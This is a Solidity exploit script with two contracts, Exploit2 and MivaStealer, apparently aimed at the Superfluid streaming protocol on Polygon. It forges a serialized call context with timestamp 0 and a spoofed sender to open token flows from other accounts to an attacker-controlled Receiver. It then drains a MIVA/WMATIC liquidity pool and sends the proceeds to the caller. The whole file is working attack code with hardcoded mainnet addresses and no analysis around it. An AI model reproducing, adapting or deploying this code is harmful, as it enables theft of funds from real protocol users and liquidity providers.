// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "src/Common.sol";

contract MivaStealer {

    ISuperToken miva;
    ISuperfluid superfluid;
    IReceiverMaster master;
    ISwapPair mivaPool;
    ICFA cfa;

    constructor() {
        master = IReceiverMaster(msg.sender);
        miva = ISuperToken(master.miva());
        superfluid = ISuperfluid(master.superfluid());
        mivaPool = ISwapPair(master.mivaPool());
        cfa = ICFA(master.cfa());
    }

    function fire() public {
        Context memory ctx;
        bytes memory _ctx;
        ctx.callType = ContextDefinitions.CALL_INFO_CALL_TYPE_APP_CALLBACK;
        ctx.timestamp = 0;
        ctx.msgSender = address(this); //victim addrses
        ctx.userData = "";
        ctx.appAllowanceToken = miva;
        _ctx = ContextDefinitions.serializeContext(ctx);
        uint before = miva.balanceOf(address(mivaPool));

        superfluid.callAgreement(
            cfa,
            abi.encodeWithSelector(ICFA.createFlow.selector, miva, address(mivaPool), 2750977865078622832810903, _ctx, ""),
            ""
        );
    }
}

contract Exploit2 {

    ISuperfluid public superfluid;
    ICFA public cfa;
    IERC20 public usdc;
    IERC20 public qi;
    WMATIC public wmatic;
    ISuperToken public usdcx;
    ISuperToken public miva;
    ISuperToken public qix;
    MATICx public maticx;
    ISwapFactory public swapFactory;
    Receiver public receiver;
    ISwapPair public usdcPool; // WMATIC-USDC pool
    ISwapPair public mivaPool; // WMATIC-MIVA pool
    ISwapPair public qiPool;

    event SMTM(address receiver, uint amount);


    constructor() {
        superfluid = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
        cfa = ICFA(0x6EeE6060f715257b970700bc2656De21dEdF074C);
        usdcx = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
        miva = ISuperToken(0xC0b2983A17573660053BEEED6FDb1053107cf387);
        qix = ISuperToken(0xe1cA10e6a10c0F72B74dF6b7339912BaBfB1f8B5);
        maticx = MATICx(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);
        swapFactory = ISwapFactory(0x5757371414417b8C6CAad45bAeF941aBc7d3Ab32); // quickSwap factory
        usdc = IERC20(usdcx.getUnderlyingToken());
        qi = IERC20(qix.getUnderlyingToken());
        wmatic = WMATIC(maticx.getUnderlyingToken());
        usdcPool = ISwapPair(swapFactory.getPair(address(wmatic), address(usdc))); // WETH-USDC pool
        mivaPool = ISwapPair(swapFactory.getPair(address(wmatic), address(miva))); // WETH-MIVA pool
        qiPool = ISwapPair(swapFactory.getPair(address(wmatic), address(qi))); // WETH-QI pool
    }

    function buy_tokens(ISwapPair pool, uint256 maticAmount) internal returns (uint256) {
        uint112 reserveIn;
        uint112 reserveOut;
        IERC20 token0 = IERC20(pool.token0());
        IERC20 token1 = IERC20(pool.token1());
        require(address(token0) == address(wmatic));
        maticx.upgradeByETH{value: maticAmount}();
        maticx.downgrade(maticAmount);
        token0.transfer(address(pool), maticAmount);
        (reserveIn, reserveOut,) = pool.getReserves();
        pool.swap(0, SwapUtils.getAmountOut(maticAmount, reserveIn, reserveOut), address(this), "");
        return token1.balanceOf(address(this));
    }

    function sell_tokens(ISwapPair pool, uint256 sellAmount) internal returns (uint256) {
        uint112 reserveIn;
        uint112 reserveOut;
        uint256 amountIn;
        uint256 amountOut;
        uint256 wmaticAmount;
        wmaticAmount = wmatic.balanceOf(address(this));
        IERC20 token0 = IERC20(pool.token0());
        IERC20 token1 = IERC20(pool.token1());
        require(address(token0) == address(wmatic), "token0 is not WMATIC");
        (reserveOut, reserveIn, ) = pool.getReserves();
        amountIn = sellAmount;
        amountOut = SwapUtils.getAmountOut(amountIn, reserveIn, reserveOut);
        token1.transfer(address(pool), amountIn);
        pool.swap(amountOut, 0, address(this),"");
        wmaticAmount = wmatic.balanceOf(address(this)) - wmaticAmount;
        return wmaticAmount;
    }

    function fire() public payable {

        uint256 amountIn;
        uint256 amountOut;
        uint112 reserveIn;
        uint112 reserveOut;

        // initialize receiver
        receiver = new Receiver(address(this));

        // create a flow between Exploit and Receiver, where ctx has timestamp 0
        Context memory ctx;
        bytes memory _ctx;
        ctx.callType = ContextDefinitions.CALL_INFO_CALL_TYPE_APP_CALLBACK;
        ctx.timestamp = 0;
        ctx.msgSender = address(this); //victim addrses
        ctx.userData = "";

        ctx.appAllowanceToken = maticx;
        _ctx = ContextDefinitions.serializeContext(ctx);
        superfluid.callAgreement(
            cfa,
            abi.encodeWithSelector(ICFA.createFlow.selector, maticx, address(receiver), 105220551461463, _ctx, ""),
            ""
        );

        ctx.appAllowanceToken = usdcx;
        _ctx = ContextDefinitions.serializeContext(ctx);
        superfluid.callAgreement(
            cfa,
            abi.encodeWithSelector(ICFA.createFlow.selector, usdcx, address(receiver), 650128378747129, _ctx, ""),
            ""
        );

        ctx.appAllowanceToken = qix;
        _ctx = ContextDefinitions.serializeContext(ctx);
        superfluid.callAgreement(
            cfa,
            abi.encodeWithSelector(ICFA.createFlow.selector, qix, address(receiver), 0.012 ether, _ctx, ""),
            ""
        );
        
        // for miva, push it into the pool directly
        for (uint i = 0; i < 1; i++) {
            MivaStealer m = new MivaStealer();
            m.fire();
            (reserveOut, reserveIn, ) = mivaPool.getReserves();
            amountIn = miva.balanceOf(address(mivaPool)) - reserveIn;
            amountOut = SwapUtils.getAmountOut(amountIn, reserveIn, reserveOut);
            mivaPool.swap(amountOut, 0, address(receiver), "");
        }
       

        

        receiver.redeem();

        uint256 amount = address(this).balance;
        payable(tx.origin).transfer(amount);
        require(tx.origin.balance >= amount);
        emit SMTM(tx.origin, amount);
    }

    receive() external payable {

    }
}

